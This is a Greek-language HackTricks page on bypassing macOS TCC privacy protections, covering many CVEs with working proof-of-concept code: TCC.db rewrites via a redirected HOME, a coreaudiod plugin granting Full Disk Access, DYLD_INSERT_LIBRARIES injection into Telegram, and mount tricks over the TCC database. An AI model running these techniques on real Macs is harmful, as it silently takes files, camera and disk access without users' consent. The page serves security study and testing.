# Παρακάμψεις TCC στο macOS

{{#include ../../../../../banners/hacktricks-training.md}}

## Ανά λειτουργικότητα

### Παράκαμψη εγγραφής

Αυτό δεν είναι bypass, αλλά απλώς ο τρόπος με τον οποίο λειτουργεί το TCC: **Δεν προστατεύει από την εγγραφή**. Αν το Terminal **δεν έχει πρόσβαση για ανάγνωση στο Desktop ενός χρήστη, μπορεί και πάλι να γράψει σε αυτό**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
Το **extended attribute `com.apple.macl`** προστίθεται στο νέο **αρχείο** για να δώσει στην **creators app** πρόσβαση ανάγνωσής του.

### TCC ClickJacking

Είναι δυνατή η **τοποθέτηση ενός παραθύρου πάνω από το TCC prompt** ώστε να κάνει τον χρήστη να το **αποδεχτεί** χωρίς να το αντιληφθεί. Μπορείτε να βρείτε ένα PoC στο [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

Ο attacker μπορεί να **δημιουργήσει apps με οποιοδήποτε όνομα** (π.χ. Finder, Google Chrome...) στο **`Info.plist`** και να τα κάνει να ζητήσουν πρόσβαση σε κάποια τοποθεσία που προστατεύεται από το TCC. Ο χρήστης θα νομίζει ότι η νόμιμη εφαρμογή είναι αυτή που ζητά την πρόσβαση.\
Επιπλέον, είναι δυνατή η **αφαίρεση της νόμιμης εφαρμογής από το Dock και η τοποθέτηση της fake εφαρμογής σε αυτό**, ώστε όταν ο χρήστης κάνει κλικ στη fake εφαρμογή (η οποία μπορεί να χρησιμοποιεί το ίδιο icon), αυτή να μπορεί να καλέσει τη νόμιμη εφαρμογή, να ζητήσει TCC permissions και να εκτελέσει ένα malware, κάνοντας τον χρήστη να πιστεύει ότι η νόμιμη εφαρμογή ζήτησε την πρόσβαση.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Περισσότερες πληροφορίες και PoC στο:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Από προεπιλογή, η πρόσβαση μέσω **SSH είχε "Full Disk Access"**. Για να την απενεργοποιήσετε, πρέπει να εμφανίζεται στη λίστα αλλά να είναι απενεργοποιημένη (η αφαίρεσή της από τη λίστα δεν θα αφαιρέσει αυτά τα privileges):

![TCC Request by arbitrary name - SSH Bypass: Από προεπιλογή, η πρόσβαση μέσω SSH είχε "Full Disk Access". Για να την απενεργοποιήσετε, πρέπει να εμφανίζεται στη λίστα αλλά να είναι απενεργοποιημένη (η αφαίρεσή της...](<../../../../../images/image (1077).png>)

Εδώ μπορείτε να βρείτε παραδείγματα για το πώς ορισμένα **malwares κατάφεραν να παρακάμψουν αυτή την προστασία**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

> [!CAUTION]
> Σημειώστε ότι πλέον, για να μπορέσετε να ενεργοποιήσετε το SSH χρειάζεστε **Full Disk Access**

### Handle extensions - CVE-2022-26767

Το attribute **`com.apple.macl`** δίνεται σε αρχεία για να παρέχει σε **μια συγκεκριμένη εφαρμογή permissions ανάγνωσής τους.** Αυτό το attribute ορίζεται όταν γίνεται **drag\&drop** ενός αρχείου πάνω σε ένα app ή όταν ένας χρήστης κάνει **double-click** σε ένα αρχείο για να το ανοίξει με την **default application**.

Επομένως, ένας χρήστης θα μπορούσε να **καταχωρίσει ένα malicious app** για να χειρίζεται όλες τις extensions και να καλέσει το Launch Services για να **ανοίξει** οποιοδήποτε αρχείο (οπότε στο malicious αρχείο θα παραχωρηθεί πρόσβαση ανάγνωσής του).

### iCloud

Με το entitlement **`com.apple.private.icloud-account-access`** είναι δυνατή η επικοινωνία με το **`com.apple.iCloudHelper`** XPC service, το οποίο θα **παρέχει iCloud tokens**.

Τα **iMovie** και **Garageband** είχαν αυτό το entitlement και άλλα που το επέτρεπαν.

Για περισσότερες **πληροφορίες** σχετικά με το exploit για την **απόκτηση icloud tokens** μέσω αυτού του entitlement, δείτε την ομιλία: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

Ένα app με το permission **`kTCCServiceAppleEvents`** θα μπορεί να **ελέγχει άλλα Apps**. Αυτό σημαίνει ότι θα μπορούσε να **κάνει abuse στα permissions που έχουν παραχωρηθεί στα άλλα Apps**.

Για περισσότερες πληροφορίες σχετικά με τα Apple Scripts, δείτε:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Για παράδειγμα, αν ένα App έχει **Automation permission πάνω στο `iTerm`**, όπως σε αυτό το παράδειγμα όπου το **`Terminal`** έχει πρόσβαση στο iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

Το Terminal, το οποίο δεν έχει FDA, μπορεί να καλέσει το iTerm, το οποίο το έχει, και να το χρησιμοποιήσει για την εκτέλεση ενεργειών:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Μέσω Finder

Ή, αν ένα App έχει πρόσβαση μέσω Finder, θα μπορούσε να εκτελέσει ένα script όπως αυτό:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Ανά συμπεριφορά App

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Το **tccd daemon** στο **userland** χρησιμοποιούσε τη μεταβλητή **`HOME`** **env** για να αποκτήσει πρόσβαση στη βάση δεδομένων χρηστών του TCC από το: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Σύμφωνα με [αυτήν την ανάρτηση στο Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) και επειδή το TCC daemon εκτελείται μέσω του **`launchd`** στο domain του τρέχοντος χρήστη, είναι δυνατός ο **έλεγχος όλων των environment variables** που του μεταβιβάζονται.\
Έτσι, ένας **attacker θα μπορούσε να ορίσει τη μεταβλητή περιβάλλοντος `$HOME`** στο **`launchctl`**, ώστε να δείχνει σε έναν **ελεγχόμενο** **directory**, να κάνει **restart** στο **TCC** daemon και στη συνέχεια να **τροποποιήσει απευθείας τη βάση δεδομένων του TCC**, παρέχοντας στον εαυτό του **κάθε διαθέσιμο TCC entitlement** χωρίς να εμφανιστεί ποτέ prompt στον end user.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Σημειώσεις

Το **Notes** είχε πρόσβαση σε τοποθεσίες που προστατεύονται από το TCC, αλλά όταν δημιουργείται μια σημείωση, αυτή **δημιουργείται σε μη προστατευμένη τοποθεσία**. Επομένως, μπορούσατε να ζητήσετε από το Notes να αντιγράψει ένα προστατευμένο αρχείο σε μια σημείωση (δηλαδή σε μη προστατευμένη τοποθεσία) και στη συνέχεια να αποκτήσετε πρόσβαση στο αρχείο:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Το binary `/usr/libexec/lsd` με τη library `libsecurity_translocate` είχε το entitlement `com.apple.private.nullfs_allow`, το οποίο του επέτρεπε να δημιουργεί **nullfs** mount, καθώς και το entitlement `com.apple.private.tcc.allow` με **`kTCCServiceSystemPolicyAllFiles`** για πρόσβαση σε κάθε αρχείο.

Ήταν δυνατό να προστεθεί το quarantine attribute στο "Library", να κληθεί το **`com.apple.security.translocation`** XPC service και στη συνέχεια αυτό να κάνει map το Library στο **`$TMPDIR/AppTranslocation/d/d/Library`**, όπου όλα τα documents μέσα στο Library μπορούσαν να **προσπελαστούν**.

### CVE-2023-38571 - Music & TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

Το **`Music`** έχει ένα ενδιαφέρον feature: Όταν εκτελείται, κάνει **import** τα αρχεία που αποτίθενται στο **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** στη "media library" του χρήστη. Επιπλέον, καλεί κάτι σαν: **`rename(a, b);`** όπου τα `a` και `b` είναι:

- `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
- `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3"`

Αυτή η **`rename(a, b);`** συμπεριφορά είναι ευάλωτη σε **Race Condition**, καθώς είναι δυνατό να τοποθετηθεί μέσα στον φάκελο `Automatically Add to Music.localized` ένα πλαστό αρχείο **TCC.db** και, στη συνέχεια, όταν δημιουργηθεί ο νέος φάκελος (b), να αντιγραφεί το αρχείο, να διαγραφεί και να δείχνει στο **`~/Library/Application Support/com.apple.TCC`**/.
**Περισσότερες πληροφορίες** [**στο writeup**](https://gergelykalman.com/CVE-2023-38571-a-macOS-TCC-bypass-in-Music-and-TV.html)


### SQLITE_SQLLOG_DIR - CVE-2023-32422

Αν οριστεί το **`SQLITE_SQLLOG_DIR="path/folder"`**, αυτό ουσιαστικά σημαίνει ότι **οποιοδήποτε ανοιχτό db αντιγράφεται σε αυτήν τη διαδρομή**. Σε αυτό το CVE, έγινε abuse αυτού του control για **write** μέσα σε μια **SQLite database** που πρόκειται να **ανοιχτεί από μια process με FDA, τη TCC database**, και στη συνέχεια έγινε abuse του **`SQLITE_SQLLOG_DIR`** με ένα **symlink στο filename**, ώστε όταν ανοίξει αυτή η database, το user **TCC.db να overwritten** με αυτήν που ανοίχτηκε.\
**Περισσότερες πληροφορίες** [**στο writeup**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **και**[ **στο talk**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y&t=20548s).

### **SQLITE_AUTO_TRACE**

Αν οριστεί η environment variable **`SQLITE_AUTO_TRACE`**, η library **`libsqlite3.dylib`** θα ξεκινήσει να κάνει **logging** σε όλα τα SQL queries. Πολλές applications χρησιμοποιούσαν αυτήν τη library, επομένως ήταν δυνατό να καταγραφούν όλα τα SQLite queries τους.

Αρκετές Apple applications χρησιμοποιούσαν αυτήν τη library για πρόσβαση σε πληροφορίες που προστατεύονται από το TCC.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL_DUMP_PIPELINES_TO_JSON_FILE - CVE-2023-32407

Αυτή η **env variable χρησιμοποιείται από το `Metal` framework**, το οποίο είναι dependency για διάφορα προγράμματα, κυρίως το `Music`, που διαθέτει FDA.

Ορίζοντας τα εξής: `MTL_DUMP_PIPELINES_TO_JSON_FILE="path/name"`. Αν το `path` είναι valid directory, το bug θα ενεργοποιηθεί και μπορούμε να χρησιμοποιήσουμε το `fs_usage` για να δούμε τι συμβαίνει στο πρόγραμμα:

- ένα αρχείο θα γίνει `open()`, με όνομα `path/.dat.nosyncXXXX.XXXXXX` (το X είναι τυχαίο)
- ένα ή περισσότερα `write()` θα γράψουν τα περιεχόμενα στο αρχείο (δεν τα ελέγχουμε)
- το `path/.dat.nosyncXXXX.XXXXXX` θα γίνει `renamed()` σε `path/name`

Πρόκειται για εγγραφή προσωρινού αρχείου, ακολουθούμενη από ένα **`rename(old, new)`**, το οποίο **δεν είναι ασφαλές**.

Δεν είναι ασφαλές επειδή πρέπει να **κάνει resolve τα old και new paths ξεχωριστά**, κάτι που μπορεί να απαιτήσει χρόνο και να είναι ευάλωτο σε Race Condition. Για περισσότερες πληροφορίες, μπορείτε να ελέγξετε τη συνάρτηση `renameat_internal()` του `xnu`.

> [!CAUTION]
> Βασικά, αν μια privileged process κάνει rename από έναν φάκελο που ελέγχετε, θα μπορούσατε να κερδίσετε ένα RCE και να την κάνετε να προσπελάσει διαφορετικό αρχείο ή, όπως σε αυτό το CVE, να ανοίξει το αρχείο που δημιούργησε η privileged app και να αποθηκεύσει ένα FD.
>
> Αν το rename προσπελαύνει έναν φάκελο που ελέγχετε, ενώ έχετε τροποποιήσει το source file ή έχετε ένα FD προς αυτό, αλλάζετε το destination file (ή folder) ώστε να δείχνει σε ένα symlink, για να μπορείτε να γράφετε όποτε θέλετε.

Αυτή ήταν η επίθεση στο CVE. Για παράδειγμα, για να κάνουμε overwrite το `TCC.db` του χρήστη, μπορούμε να:

- δημιουργήσουμε το `/Users/hacker/ourlink`, ώστε να δείχνει στο `/Users/hacker/Library/Application Support/com.apple.TCC/`
- δημιουργήσουμε το directory `/Users/hacker/tmp/`
- ορίσουμε το `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`
- ενεργοποιήσουμε το bug εκτελώντας το `Music` με αυτή την env var
- εντοπίσουμε το `open()` του `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` (το X είναι τυχαίο)
- εδώ κάνουμε επίσης `open()` αυτό το αρχείο για εγγραφή και διατηρούμε το file descriptor
- αλλάζουμε ατομικά το `/Users/hacker/tmp` με το `/Users/hacker/ourlink` **σε loop**
- το κάνουμε αυτό για να μεγιστοποιήσουμε τις πιθανότητες επιτυχίας, καθώς το race window είναι αρκετά μικρό, αλλά η αποτυχία του race έχει αμελητέες συνέπειες
- περιμένουμε λίγο
- ελέγχουμε αν σταθήκαμε τυχεροί
- αν όχι, εκτελούμε ξανά τη διαδικασία από την αρχή

Περισσότερες πληροφορίες στο [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

> [!CAUTION]
> Πλέον, αν προσπαθήσετε να χρησιμοποιήσετε την env variable `MTL_DUMP_PIPELINES_TO_JSON_FILE`, οι apps δεν θα εκκινούν.

### Apple Remote Desktop

Ως root, θα μπορούσατε να ενεργοποιήσετε αυτή την υπηρεσία και ο **ARD agent θα έχει full disk access**, το οποίο στη συνέχεια θα μπορούσε να γίνει abuse από έναν χρήστη, ώστε να αντιγράψει μια νέα **TCC user database**.

## Μέσω **NFSHomeDirectory**

Το TCC χρησιμοποιεί μια database στον HOME folder του χρήστη για να ελέγχει την πρόσβαση σε resources που αφορούν συγκεκριμένα τον χρήστη, στη διεύθυνση **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Επομένως, αν ο χρήστης καταφέρει να κάνει restart το TCC με μια env variable $HOME που δείχνει σε έναν **διαφορετικό φάκελο**, θα μπορούσε να δημιουργήσει μια νέα TCC database στο **/Library/Application Support/com.apple.TCC/TCC.db** και να εξαπατήσει το TCC ώστε να εκχωρήσει οποιοδήποτε TCC permission σε οποιαδήποτε app.

> [!TIP]
> Σημειώστε ότι η Apple χρησιμοποιεί τη ρύθμιση που είναι αποθηκευμένη στο profile του χρήστη, στο attribute **`NFSHomeDirectory`**, για την **τιμή του `$HOME`**. Επομένως, αν θέσετε υπό τον έλεγχό σας μια application με permissions για την τροποποίηση αυτής της τιμής (**`kTCCServiceSystemPolicySysAdminFiles`**), μπορείτε να **weaponize** αυτή την επιλογή με ένα TCC bypass.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

Το **πρώτο POC** χρησιμοποιεί τα [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) και [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) για να τροποποιήσει τον **HOME** folder του χρήστη.

1. Λάβετε ένα _csreq_ blob για την target app.
2. Τοποθετήστε ένα fake _TCC.db_ file με το απαιτούμενο access και το _csreq_ blob.
3. Κάντε export το Directory Services entry του χρήστη με το [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Τροποποιήστε το Directory Services entry για να αλλάξετε το home directory του χρήστη.
5. Κάντε import το τροποποιημένο Directory Services entry με το [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Σταματήστε το _tccd_ του χρήστη και κάντε reboot τη process.

Το δεύτερο POC χρησιμοποιούσε το **`/usr/libexec/configd`**, το οποίο διέθετε `com.apple.private.tcc.allow` με την τιμή `kTCCServiceSystemPolicySysAdminFiles`.\
Ήταν δυνατή η εκτέλεση του **`configd`** με την επιλογή **`-t`**, μέσω της οποίας ένας attacker μπορούσε να καθορίσει ένα **custom Bundle για φόρτωση**. Επομένως, το exploit **αντικαθιστά** τη μέθοδο **`dsexport`** και **`dsimport`** για την αλλαγή του home directory του χρήστη με **`configd` code injection**.

Για περισσότερες πληροφορίες, ελέγξτε το [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).

## Μέσω process injection

Υπάρχουν διάφορες τεχνικές για την εισαγωγή κώδικα μέσα σε μια process και την εκμετάλλευση των TCC privileges της:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Επιπλέον, το πιο συνηθισμένο process injection για bypass του TCC γίνεται μέσω **plugins (load library)**.\
Τα plugins είναι επιπλέον κώδικας, συνήθως με τη μορφή libraries ή plist, που θα **φορτωθούν από την κύρια application** και θα εκτελεστούν στο context της. Επομένως, αν η κύρια application είχε πρόσβαση σε TCC restricted files (μέσω granted permissions ή entitlements), ο **custom code θα έχει επίσης πρόσβαση** σε αυτά.

### CVE-2020-27937 - Directory Utility

Η application `/System/Library/CoreServices/Applications/Directory Utility.app` διέθετε το entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, φόρτωνε plugins με extension **`.daplug`** και **δεν διέθετε hardened** runtime.

Για να γίνει weaponize αυτό το CVE, το **`NFSHomeDirectory`** **αλλάζει** (με abuse του προηγούμενου entitlement), ώστε να καταστεί δυνατή η **κατάληψη της TCC database των χρηστών** για bypass του TCC.

Για περισσότερες πληροφορίες, ελέγξτε το [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).

### CVE-2020-29621 - Coreaudiod

Το binary **`/usr/sbin/coreaudiod`** διέθετε τα entitlements `com.apple.security.cs.disable-library-validation` και `com.apple.private.tcc.manager`. Το πρώτο **επέτρεπε code injection**, ενώ το δεύτερο του έδινε πρόσβαση στη **διαχείριση του TCC**.

Αυτό το binary επέτρεπε τη φόρτωση **third party plug-ins** από τον φάκελο `/Library/Audio/Plug-Ins/HAL`. Επομένως, ήταν δυνατή η **φόρτωση ενός plugin και η εκμετάλλευση των TCC permissions** με αυτό το PoC:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Για περισσότερες πληροφορίες, δείτε την [**original report**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Device Abstraction Layer (DAL) Plug-Ins

Οι system applications που ανοίγουν camera stream μέσω του Core Media I/O (apps με **`kTCCServiceCamera`**) φορτώνουν **in the process αυτά τα plugins**, τα οποία βρίσκονται στο `/Library/CoreMediaIO/Plug-Ins/DAL` (χωρίς περιορισμό από το SIP).

Η απλή αποθήκευση εκεί μιας library με τον κοινό **constructor** αρκεί για **inject code**.

Αρκετές Apple applications ήταν ευάλωτες σε αυτό.

### Firefox

Η εφαρμογή Firefox είχε τα entitlements `com.apple.security.cs.disable-library-validation` και `com.apple.security.cs.allow-dyld-environment-variables`:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Για περισσότερες πληροφορίες σχετικά με το πώς μπορείτε να το εκμεταλλευτείτε εύκολα, [**δείτε το original report**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

Το binary `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` είχε τα entitlements **`com.apple.private.tcc.allow`** και **`com.apple.security.get-task-allow`**, τα οποία επέτρεπαν την εισαγωγή κώδικα μέσα στη διεργασία και τη χρήση των TCC privileges.

### CVE-2023-26818 - Telegram

Το Telegram είχε τα entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** και **`com.apple.security.cs.disable-library-validation`**, επομένως ήταν δυνατή η κατάχρησή του για **πρόσβαση στα permissions του**, όπως η καταγραφή με την camera. Μπορείτε να [**βρείτε το payload στο writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Σημειώστε ότι, για τη χρήση της env variable ώστε να φορτωθεί μια library, δημιουργήθηκε ένα **custom plist** για την εισαγωγή αυτής της library και χρησιμοποιήθηκε το **`launchctl`** για την εκκίνησή της:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Μέσω open invocations

Είναι δυνατή η επίκληση του **`open`** ακόμη και σε περιβάλλον sandbox

### Terminal Scripts

Είναι αρκετά συνηθισμένο να παρέχεται **Full Disk Access (FDA)** στο Terminal, τουλάχιστον σε υπολογιστές που χρησιμοποιούνται από άτομα της τεχνολογικής κοινότητας. Επίσης, είναι δυνατή η επίκληση scripts **`.terminal`** μέσω αυτού.

Τα scripts **`.terminal`** είναι αρχεία plist όπως το παρακάτω, με την εντολή προς εκτέλεση στο key **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Μια εφαρμογή θα μπορούσε να γράψει ένα terminal script σε μια τοποθεσία όπως το /tmp και να το εκκινήσει με μια εντολή όπως:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Με mounting

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Οποιοσδήποτε user** (ακόμα και unprivileged users) μπορεί να δημιουργήσει και να κάνει mount ένα snapshot του Time Machine και να αποκτήσει **access σε ΟΛΑ τα αρχεία** αυτού του snapshot.\
Το **μόνο privilege** που απαιτείται είναι η εφαρμογή που χρησιμοποιείται (όπως το `Terminal`) να έχει **Full Disk Access** (FDA) access (`kTCCServiceSystemPolicyAllfiles`), το οποίο πρέπει να παραχωρηθεί από έναν admin.
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Μια πιο λεπτομερής εξήγηση μπορεί να [**βρεθεί στην αρχική αναφορά**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - Mount πάνω από TCC file

Ακόμα και αν το TCC DB file προστατευόταν, ήταν δυνατή η **mount πάνω από τον κατάλογο** ενός νέου TCC.db file:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Έλεγξε το **πλήρες exploit** στο [**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/).

### CVE-2024-40855

Όπως εξηγείται στο [original writeup](https://www.kandji.io/blog/macos-audit-story-part2), αυτό το CVE εκμεταλλευόταν το `diskarbitrationd`.

Η συνάρτηση `DADiskMountWithArgumentsCommon` από το public `DiskArbitration` framework εκτελούσε τους ελέγχους ασφαλείας. Ωστόσο, ήταν δυνατό να παρακαμφθεί με απευθείας κλήση του `diskarbitrationd` και, επομένως, με χρήση στοιχείων `../` στο path και symlinks.

Αυτό επέτρεπε σε έναν attacker να πραγματοποιεί arbitrary mounts σε οποιαδήποτε τοποθεσία, ακόμη και πάνω από τη βάση δεδομένων TCC, λόγω του entitlement `com.apple.private.security.storage-exempt.heritable` του `diskarbitrationd`.

### asr

Το εργαλείο **`/usr/sbin/asr`** επέτρεπε την αντιγραφή ολόκληρου του disk και το mount του σε άλλη τοποθεσία, παρακάμπτοντας τις προστασίες TCC.

### Location Services

Υπάρχει μια τρίτη βάση δεδομένων TCC στο **`/var/db/locationd/clients.plist`**, η οποία υποδεικνύει τους clients που επιτρέπεται να **access location services**.\
Ο φάκελος **`/var/db/locationd/` δεν προστατευόταν από DMG mounting**, επομένως ήταν δυνατό να κάνουμε mount το δικό μας plist.

## Μέσω startup apps


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Μέσω grep

Σε αρκετές περιπτώσεις, τα αρχεία αποθηκεύουν sensitive information, όπως emails, phone numbers, messages... σε μη προστατευμένες τοποθεσίες, κάτι που θεωρείται vulnerability στην Apple.

